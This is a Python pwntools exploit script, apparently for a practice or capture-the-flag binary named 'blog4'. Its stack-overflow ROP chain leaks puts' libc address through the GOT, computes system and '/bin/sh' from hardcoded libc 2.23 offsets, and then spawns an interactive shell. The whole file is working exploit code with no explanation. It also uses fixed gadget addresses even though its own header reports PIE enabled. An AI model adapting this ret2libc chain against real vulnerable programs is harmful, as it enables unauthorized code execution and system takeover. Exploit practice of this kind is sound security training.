# -*- coding: utf-8 -*-

'''
[*] '/home/wkyuu/Desktop/temp/blog4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
'''

from pwn import *
import pwn

p64 = pwn.p64
u64 = pwn.u64

# context(log_level='debug', terminal=['tmux', 'splitw', '-h'])
context(log_level='debug')
fileName = './blog4'
p = process(fileName)
elf = ELF(fileName)

# bin
bin_func_main = elf.sym['main']
bin_func_vuln = elf.sym['vuln']
bin_puts_plt = elf.sym['puts']
bin_puts_got = elf.got['puts']
bin_pop_rdi_ret = 0x4012A3
bin_ret = 0x4012A4

# libc
# libc6_2.23-0ubuntu3_amd64 旧版本
libc_puts = 0x6f5d0
libc_system = 0x45380
libc_str_bin_sh = 0x18c58b

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

gdbscript = '''
b *vuln+36
b *vuln+55
c
c
c
'''
# gdb.attach(p, gdbscript=gdbscript)

# leak_libc
logger('leak_libc')
payload = b'a' * (0xb + 0x8) + p64(bin_pop_rdi_ret) + \
    p64(bin_puts_got) + p64(bin_puts_plt) + p64(bin_func_vuln)
p.sendlineafter(b'input sth:\n', payload)
p.recvuntil('\x0a')

leak_puts_got = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak_puts_got - libc_puts
libc_system = libc_base + libc_system
libc_str_bin_sh = libc_base + libc_str_bin_sh

logger('libc_base', hex(libc_base), 'success')
logger('leak_puts_got', hex(leak_puts_got), 'success')
logger('libc_system', hex(libc_system), 'success')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'success')

# rop
logger('rop')
payload = b'b' * (0xb + 0x8) + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)
p.sendlineafter(b'input sth:\n', payload)
p.interactive()
